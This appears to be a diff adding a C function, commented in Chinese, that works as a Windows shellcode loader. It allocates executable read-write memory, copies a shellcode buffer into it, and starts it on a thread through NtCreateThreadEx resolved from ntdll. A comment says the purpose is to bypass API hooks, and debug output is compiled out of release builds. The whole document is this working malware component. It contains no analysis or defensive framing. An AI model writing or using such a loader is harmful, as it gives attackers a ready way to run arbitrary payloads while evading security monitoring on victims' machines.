@@ -1,0 +1,90 @@
+// 系统调用加载方式：通过ntdll系统调用执行Shellcode
+void ExecuteLoader(PBYTE shellcode, SIZE_T shellcodeSize) {
+#ifdef _DEBUG
+    printf("[*] 系统调用方式执行Shellcode\n");
+#endif
+    
+    // 分配可执行内存
+    LPVOID exec_mem = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!exec_mem) {
+#ifdef _DEBUG
+        printf("[!] VirtualAlloc失败: %d\n", GetLastError());
+#endif
+        return;
+    }
+    
+    // 复制Shellcode
+    memcpy(exec_mem, shellcode, shellcodeSize);
+    
+#ifdef _DEBUG
+    printf("[*] Shellcode已复制到: %p, 大小: %d\n", exec_mem, shellcodeSize);
+#endif
+    
+    // 使用系统调用执行（绕过API钩子）
+    typedef NTSTATUS (NTAPI *PFN_NTCREATETHREAD)(
+        PHANDLE ThreadHandle,
+        ACCESS_MASK DesiredAccess,
+        POBJECT_ATTRIBUTES ObjectAttributes,
+        HANDLE ProcessHandle,
+        PVOID StartRoutine,
+        PVOID Argument,
+        BOOL CreateSuspended,
+        ULONG StackZeroBits,
+        ULONG SizeOfStackCommit,
+        ULONG SizeOfStackReserve,
+        PVOID BytesToReserve
+    );
+    
+    // 获取ntdll.dll句柄
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) {
+#ifdef _DEBUG
+        printf("[!] 获取ntdll.dll失败\n");
+#endif
+        VirtualFree(exec_mem, 0, MEM_RELEASE);
+        return;
+    }
+    
+    // 获取NtCreateThreadEx函数地址
+    PFN_NTCREATETHREAD pNtCreateThreadEx = (PFN_NTCREATETHREAD)GetProcAddress(hNtdll, "NtCreateThreadEx");
+    if (!pNtCreateThreadEx) {
+#ifdef _DEBUG
+        printf("[!] 获取NtCreateThreadEx失败\n");
+#endif
+        VirtualFree(exec_mem, 0, MEM_RELEASE);
+        return;
+    }
+    
+    // 创建线程执行Shellcode
+    HANDLE hThread = NULL;
+    NTSTATUS status = pNtCreateThreadEx(
+        &hThread,
+        THREAD_ALL_ACCESS,
+        NULL,
+        GetCurrentProcess(),
+        exec_mem,
+        NULL,
+        FALSE,
+        0,
+        0,
+        0,
+        NULL
+    );
+    
+    if (status != 0 || !hThread) {
+#ifdef _DEBUG
+        printf("[!] NtCreateThreadEx失败: 0x%08X\n", status);
+#endif
+        VirtualFree(exec_mem, 0, MEM_RELEASE);
+        return;
+    }
+    
+#ifdef _DEBUG
+    printf("[*] 线程创建成功，等待执行完成\n");
+#endif
+    
+    // 等待线程执行完成
+    WaitForSingleObject(hThread, INFINITE);
+    CloseHandle(hThread);
+    VirtualFree(exec_mem, 0, MEM_RELEASE);
+}
